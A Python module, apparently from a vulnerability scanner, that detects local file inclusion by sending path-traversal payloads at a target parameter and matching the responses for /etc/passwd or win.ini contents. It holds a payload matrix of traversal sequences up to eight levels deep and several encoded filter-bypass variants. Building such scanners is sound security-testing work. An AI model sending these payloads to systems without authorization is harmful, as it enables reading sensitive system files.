"""
Local File Inclusion (LFI) & Path Traversal Detection Module.
Systematic depth traversal testing with multi-encoding and anchored OS regex signatures.
"""

import asyncio
import re
import uuid
from typing import List, Optional
from injexion.core.config import ScanConfig
from injexion.core.constants import LFI_PATTERNS, VULN_METADATA
from injexion.core.models import Finding, InjectionTarget, Severity
from injexion.detectors.base import BaseDetector
from injexion.engine.client import AsyncHTTPClient
from injexion.engine.parameter import ParameterParser


class LFIDetector(BaseDetector):
    def __init__(self):
        super().__init__("Local File Inclusion")
        self._linux_regexes = [re.compile(p, re.MULTILINE) for p in LFI_PATTERNS["linux"]]
        self._windows_regexes = [re.compile(p, re.IGNORECASE) for p in LFI_PATTERNS["windows"]]

    def _matches_lfi(self, content: str) -> Optional[str]:
        if not content:
            return None
        for r in self._linux_regexes:
            if r.search(content):
                return "Linux (/etc/passwd)"
        for r in self._windows_regexes:
            if r.search(content):
                return "Windows (win.ini)"
        return None

    async def scan(
        self,
        target: InjectionTarget,
        client: AsyncHTTPClient,
        config: ScanConfig,
        payloads: List[str]
    ) -> List[Finding]:
        findings: List[Finding] = []
        original_url = target.url

        # Baseline response check to prevent false positives if page already contains matching text
        baseline_req = ParameterParser.build_mutated_request(
            target, target.baseline_value, original_url, mode="replace"
        )
        base_resp, _ = await client.send(**baseline_req)
        baseline_content = base_resp.text if base_resp else ""
        if self._matches_lfi(baseline_content):
            return findings

        # Generate traversal matrix
        test_sequences: List[str] = []
        
        # 1. Depth expansion (1 to 8 hops)
        for depth in range(1, 9):
            prefix = "../" * depth
            test_sequences.append(f"{prefix}etc/passwd")
            test_sequences.append(f"/{prefix}etc/passwd")
            test_sequences.append(f"{prefix}windows/win.ini")
            test_sequences.append(f"C:/{prefix}windows/win.ini")

        # 2. Encoded / filter-bypass variations
        test_sequences.extend([
            "....//....//....//....//etc/passwd",
            "..%2f..%2f..%2f..%2fetc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....//....//....//windows/win.ini",
            "..%2f..%2f..%2fwindows/win.ini",
        ])

        # Also merge user-provided custom LFI payloads
        test_sequences.extend([p for p in payloads if p not in test_sequences][:20])

        sem = asyncio.Semaphore(config.concurrency)

        async def test_lfi_payload(payload: str) -> Optional[Finding]:
            async with sem:
                mutated = ParameterParser.build_mutated_request(
                    target, payload, original_url, mode="replace"
                )
                resp, evidence = await client.send(**mutated)
                if not resp:
                    return None

                matched_os = self._matches_lfi(resp.text)
                if matched_os:
                    meta = VULN_METADATA["lfi"]
                    return Finding(
                        id=f"lfi-{uuid.uuid4().hex[:8]}",
                        vuln_type="lfi",
                        title=f"{meta['title']} ({matched_os})",
                        severity=Severity.HIGH,
                        cwe_id=meta["cwe_id"],
                        cvss_score=meta["cvss_score"],
                        target_url=target.url,
                        parameter=target.parameter,
                        parameter_type=target.param_type,
                        payload=payload,
                        evidence=evidence,
                        description=f"{meta['description']} Confirmed arbitrary file disclosure: {matched_os}.",
                        remediation=meta["remediation"],
                    )
            return None

        tasks = [test_lfi_payload(p) for p in test_sequences]
        results = await asyncio.gather(*tasks)
        for r in results:
            if r:
                findings.append(r)
                break  # Confirmed on this parameter

        return findings

